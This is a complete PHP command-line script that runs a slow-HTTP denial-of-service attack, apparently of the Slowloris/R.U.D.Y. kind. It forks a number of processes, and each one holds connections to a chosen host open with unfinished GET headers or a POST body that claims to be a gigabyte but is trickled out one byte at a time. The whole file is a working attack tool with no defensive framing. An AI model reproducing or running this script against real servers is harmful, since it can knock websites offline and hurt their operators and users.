#! /usr/bin/env php
<?php

const ARGUMENT_METHOD = 1;
const ARGUMENT_THREADS = 2;
const ARGUMENT_HOST = 3;
const ARGUMENT_PORT = 4;

function print_usage($argv)
{
    print "Usage: ./{$argv[0]} <get or post> <number of processes> <host> [port]\n";
    die();
}

function attack_get($host, $port): void
{
    $request = "GET / HTTP/1.1\r\n";
    $request .= "Host: $host\r\n";
    $request .= "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\r\n";
    $request .= "Keep-Alive: 900\r\n";
    $request .= "Content-Length: " . rand(10000, 1000000) . "\r\n";
    $request .= "Accept: *.*\r\n";
    $request .= "X-a: " . rand(1, 10000) . "\r\n";
    $sockfd = @fsockopen($host, $port, $errno, $errstr);
    @fwrite($sockfd, $request);
    while (true) {
        if (@fwrite($sockfd, "X-c:" . rand(1, 100000) . "\r\n") !== FALSE) {
            echo ".";
            sleep(rand(0, 15));
        } else {
            echo $errstr;
            echo sprintf("-%s:%s\n", $host, $port);

            echo "Get failed\n";
            $sockfd = @fsockopen($host, 80, $errno, $errstr);
            @fwrite($sockfd, $request);
        }
    }

}

function attack_post($host, $port): void
{
    $request = "POST /" . md5(rand()) . " HTTP/1.1\r\n";
    $request .= "Host: $host\r\n";
    $request .= "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\r\n";
    $request .= "Keep-Alive: 900\r\n";
    $request .= "Content-Length: 1000000000\r\n";
    $request .= "Content-Type: application/x-www-form-urlencoded\r\n";
    $request .= "Accept: *.*\r\n";
    $sockfd = @fsockopen($host, $port, $errno, $errstr);
    @fwrite($sockfd, $request);
    while (true) {
        if (@fwrite($sockfd, ".") !== FALSE) {
            echo ".";
            sleep(rand(0, 15));
        } else {
            echo "Post failed\n";
            $sockfd = @fsockopen($host, 80, $errno, $errstr);
            @fwrite($sockfd, $request);
        }
    }
}

    function attack_using_random_method($host, $port): void
    {
        if (rand(0, 1)) {
            attack_get($host, $port);
            return;
        }
        attack_post($host, $port);
    }


function main($argc, $argv)
{
    $status = 1;
    if ($argc == 4) {
        $argv[4] = $argv[3];
    } else if ($argc < 5) {
        print_usage($argv);
    }

    $pids = [];
    $number_of_threads = $argv[ARGUMENT_THREADS];
    for ($i = 0; $i < $number_of_threads; $i++) {
        $pid = pcntl_fork();
        if ($pid == -1) {
            die("Error forking!\n");
        } else if ($pid == 0) {
            $host = $argv[ARGUMENT_HOST];
            $port = $argv[ARGUMENT_PORT];

            //child process
            switch ($argv[ARGUMENT_METHOD]) {
                case 'post':
                    attack_post($host, $port);
                    break;
                case 'get':
                    attack_get($host, $port);
                    break;
                case 'random':
                    attack_using_random_method($host, $port);
                    break;
                default:
                    die("Invalid method, use 'get', 'post' or 'random' to randomize\n");
                    break;
            }
            exit(0);
        } else {
            //parent process
            $pids[] = $pid;
        }
    }
    foreach ($pids as $pid) {
        pcntl_waitpid($pid, $status);
    }
}

main($argc, $argv);
